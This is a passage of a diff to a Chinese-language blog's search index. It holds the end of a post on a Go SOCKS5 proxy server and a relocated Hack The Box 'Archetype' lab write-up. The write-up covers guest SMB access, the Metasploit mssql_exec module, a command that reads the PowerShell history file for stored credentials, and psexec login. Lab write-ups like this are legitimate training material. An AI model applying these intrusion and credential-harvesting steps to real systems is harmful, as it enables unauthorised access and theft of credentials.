class="keyword">if</span> buf[<span class="number">0</span>] != SOCKS5_VERSION &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;command version error: 0x%x\n&quot;</span>, buf[<span class="number">0</span>])</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> buf[<span class="number">1</span>] != COMMAND_CONNECT &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;command connect error: 0x%x\n&quot;</span>, buf[<span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	remote.Type = buf[<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">switch</span> remote.Type &#123;</span><br><span class="line">	<span class="keyword">case</span> TYPE_IPV4:</span><br><span class="line">		remote.Ipv4 = buf[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">	<span class="keyword">case</span> TYPE_DOMAIN:</span><br><span class="line">		addrBytes := buf[<span class="number">5</span>:n<span class="number">-2</span>]</span><br><span class="line">		remote.Domain = <span class="keyword">string</span>(addrBytes)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addrPort := buf[n<span class="number">-2</span>:n]</span><br><span class="line">	remote.Port = <span class="keyword">int</span>(addrPort[<span class="number">0</span>])*<span class="number">256</span> + <span class="keyword">int</span>(addrPort[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> remote</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Socks5Command</span><span class="params">(conn net.Conn)</span> <span class="title">net</span>.<span class="title">Conn</span></span> &#123;</span><br><span class="line">	remote := Socks5RecvCommand(conn)</span><br><span class="line">	<span class="keyword">if</span> remote == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> address <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">if</span> remote.Type == TYPE_DOMAIN &#123;</span><br><span class="line">		address = remote.Domain</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> remote.Type == TYPE_IPV4 &#123;</span><br><span class="line">		address = fmt.Sprintf(<span class="string">&quot;%d.%d.%d.%d&quot;</span>,</span><br><span class="line">			remote.Ipv4[<span class="number">0</span>], remote.Ipv4[<span class="number">1</span>], remote.Ipv4[<span class="number">2</span>], remote.Ipv4[<span class="number">3</span>])</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;remote address: %s:%d\n&quot;</span>, address, remote.Port)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Socks5SendCommand(conn, remote)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先接受到 Client 发来的目标信息，然后尝试和目标建立连接，再返回 response 给 Client</p>
+<h3 id="转发阶段-1"><a href="#转发阶段-1" class="headerlink" title="转发阶段"></a>转发阶段</h3><p>最后就是转发阶段，此时 Server 只是目标和 Client 的转发器</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Socks5Forward</span><span class="params">(client net.Conn, remote net.Conn)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;start forward\n&quot;</span>)</span><br><span class="line">	forward := <span class="function"><span class="keyword">func</span><span class="params">(dst net.Conn, src net.Conn)</span></span> &#123;</span><br><span class="line">		<span class="keyword">defer</span> dst.Close()</span><br><span class="line">		<span class="keyword">defer</span> src.Close()</span><br><span class="line">		io.Copy(src, dst)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">go</span> forward(client, remote)</span><br><span class="line">	<span class="keyword">go</span> forward(remote, client)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>双向转发，所以用两个 go-runtime</p>
+<p>完整代码在</p>
+<p><a href="https://github.com/ethushiroha/small_tools/blob/main/Socks5/Server.go">https://github.com/ethushiroha/small_tools/blob/main/Socks5/Server.go</a></p>
 ]]></content>
-      <categories>
-        <category>exploit</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>tools</tag>
-      </tags>
   </entry>
   <entry>
     <title>使用nps</title>
@@ -4141,6 +4262,78 @@
       </tags>
   </entry>
   <entry>
+    <title>box:Archetype</title>
+    <url>//box_Archetype.html</url>
+    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
+<a id="more"></a>
+
+<h1 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h1><ul>
+<li>  靶机： <code>10.10.10.27</code></li>
+<li>  攻击机：<code>10.10.14.34</code></li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hack_the_box]</span><br><span class="line">└─$ nmap 10.10.10.27 -A           </span><br><span class="line">Nmap scan report for 10.10.10.27</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|   DNS_Domain_Name: Archetype</span><br><span class="line">|   DNS_Computer_Name: Archetype</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-02-24T22:44:23</span><br><span class="line">|_Not valid after:  2051-02-24T22:44:23</span><br><span class="line">|_ssl-date: 2021-02-25T08:37:30+00:00; +1h20m38s from scanner time.</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h56m37s, deviation: 3h34m40s, median: 1h20m37s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.27:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-02-25T00:36:53-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-02-25T08:36:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.65 seconds</span><br></pre></td></tr></table></figure>
+
+
+
+<p>扫描结果说明了：</p>
+<ol>
+<li> 目标是<code>Windows Server 2019</code></li>
+<li> smb可以使用guest用户登录</li>
+<li> 目标使用了<code>mssql</code></li>
+</ol>
+<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>以guest用户登录目标机器</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164220367.png" alt="image-20210225164220367"></p>
+<p>发现目标下存在backups文件夹可以访问。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164154992.png" alt="image-20210225164154992"></p>
+<p>查看一下下载下来的文件</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164413390.png" alt="image-20210225164413390"></p>
+<p>里面写到了mssql的用户名和密码</p>
+<p>不用猜都知道肯定是要用mssql执行系统命令拿shell</p>
+<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><p>由于对mssql缺乏认知和了解，不知道怎么连接上去，就尝试了一下<code>msfconsole</code></p>
+<p>看到有一个<code>mssql_exec</code>，就决定是你了小火龙</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164550486.png" alt="image-20210225164550486"></p>
+<p>设置参数，这里有一个注意点：</p>
+<blockquote>
+<p>  SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证，此处的参数值应该是操作系统身份验证方式，其前半部分ARCHETYPE是靶机的主机名，后半部分sql_svc是具有数据库登录权限的操作系统用户名。</p>
+</blockquote>
+<p>卡了我好久</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164644591.png" alt="image-20210225164644591"></p>
+<p>所以要把<code>use_windows_authent</code>设置为<code>true</code>，并且按照他的要求设置<code>domain</code>(图上未标出)，然后<code>exploit</code></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164957307.png" alt="image-20210225164957307"></p>
+<p>可以看到<code>whoami</code>命令已经执行成功了</p>
+<p>该用户的flag在<code>C:\Users\sql_svc\Desktop\user.txt</code>，使用<code>type</code> 命令获取</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165118035.png" alt="image-20210225165118035"></p>
+<p>这就是第一个flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>第一次遇到Windows，要提权emmm，不知道该怎么办。</p>
+<p>查了查wp</p>
+<blockquote>
+<p>  可以发现sql_svc同时是操作系统普通用户、数据库和数据库服务用户，值得去检查频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件：</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165415264.png" alt="image-20210225165415264"></p>
+<p>然后就懂了，这里暴露出来的肯定是用户名和密码</p>
+<p>但是这也没开3389，咋登录windows呢</p>
+<p>wp上给了一个工具<code>psexec.py</code></p>
+<p>登录上去，拿到最后的flag</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165607949.png" alt="image-20210225165607949"></p>
+<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
+<li>  对于Windows的渗透，技术不到位，有很多情况不知道解决方案（mssql，提权等）</li>
+<li>  太过于依赖工具和脚本，对原理性的知识了解不深入</li>
+</ul>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>hack the box</category>
+        <category>start point</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+        <tag>exploit</tag>
+        <tag>hack the box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>box:Included</title>
     <url>//box_Included.html</url>
     <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
@@ -4247,78 +4440,6 @@
         <tag>exploit</tag>
         <tag>hack the box</tag>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>box:Archetype</title>
-    <url>//box_Archetype.html</url>
-    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
-<a id="more"></a>
-
-<h1 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h1><ul>
-<li>  靶机： <code>10.10.10.27</code></li>
-<li>  攻击机：<code>10.10.14.34</code></li>
-</ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hack_the_box]</span><br><span class="line">└─$ nmap 10.10.10.27 -A           </span><br><span class="line">Nmap scan report for 10.10.10.27</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|   DNS_Domain_Name: Archetype</span><br><span class="line">|   DNS_Computer_Name: Archetype</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-02-24T22:44:23</span><br><span class="line">|_Not valid after:  2051-02-24T22:44:23</span><br><span class="line">|_ssl-date: 2021-02-25T08:37:30+00:00; +1h20m38s from scanner time.</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h56m37s, deviation: 3h34m40s, median: 1h20m37s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.27:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-02-25T00:36:53-08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-02-25T08:36:55</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 130.65 seconds</span><br></pre></td></tr></table></figure>
-
-
-
-<p>扫描结果说明了：</p>
-<ol>
-<li> 目标是<code>Windows Server 2019</code></li>
-<li> smb可以使用guest用户登录</li>
-<li> 目标使用了<code>mssql</code></li>
-</ol>
-<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><p>以guest用户登录目标机器</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164220367.png" alt="image-20210225164220367"></p>
-<p>发现目标下存在backups文件夹可以访问。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164154992.png" alt="image-20210225164154992"></p>
-<p>查看一下下载下来的文件</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164413390.png" alt="image-20210225164413390"></p>
-<p>里面写到了mssql的用户名和密码</p>
-<p>不用猜都知道肯定是要用mssql执行系统命令拿shell</p>
-<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><p>由于对mssql缺乏认知和了解，不知道怎么连接上去，就尝试了一下<code>msfconsole</code></p>
-<p>看到有一个<code>mssql_exec</code>，就决定是你了小火龙</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164550486.png" alt="image-20210225164550486"></p>
-<p>设置参数，这里有一个注意点：</p>
-<blockquote>
-<p>  SQL Server的身份验证方式有两种：操作系统身份验证和数据库身份验证，此处的参数值应该是操作系统身份验证方式，其前半部分ARCHETYPE是靶机的主机名，后半部分sql_svc是具有数据库登录权限的操作系统用户名。</p>
-</blockquote>
-<p>卡了我好久</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164644591.png" alt="image-20210225164644591"></p>
-<p>所以要把<code>use_windows_authent</code>设置为<code>true</code>，并且按照他的要求设置<code>domain</code>(图上未标出)，然后<code>exploit</code></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225164957307.png" alt="image-20210225164957307"></p>
-<p>可以看到<code>whoami</code>命令已经执行成功了</p>
-<p>该用户的flag在<code>C:\Users\sql_svc\Desktop\user.txt</code>，使用<code>type</code> 命令获取</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165118035.png" alt="image-20210225165118035"></p>
-<p>这就是第一个flag</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>第一次遇到Windows，要提权emmm，不知道该怎么办。</p>
-<p>查了查wp</p>
-<blockquote>
-<p>  可以发现sql_svc同时是操作系统普通用户、数据库和数据库服务用户，值得去检查频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件：</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165415264.png" alt="image-20210225165415264"></p>
-<p>然后就懂了，这里暴露出来的肯定是用户名和密码</p>
-<p>但是这也没开3389，咋登录windows呢</p>
-<p>wp上给了一个工具<code>psexec.py</code></p>
-<p>登录上去，拿到最后的flag</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210225165607949.png" alt="image-20210225165607949"></p>
-<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
-<li>  对于Windows的渗透，技术不到位，有很多情况不知道解决方案（mssql，提权等）</li>
-<li>  太过于依赖工具和脚本，对原理性的知识了解不深入</li>
-</ul>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>hack the box</category>
-        <category>start point</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
-        <tag>exploit</tag>
-        <tag>hack the box</tag>
       </tags>
   </entry>
   <entry>
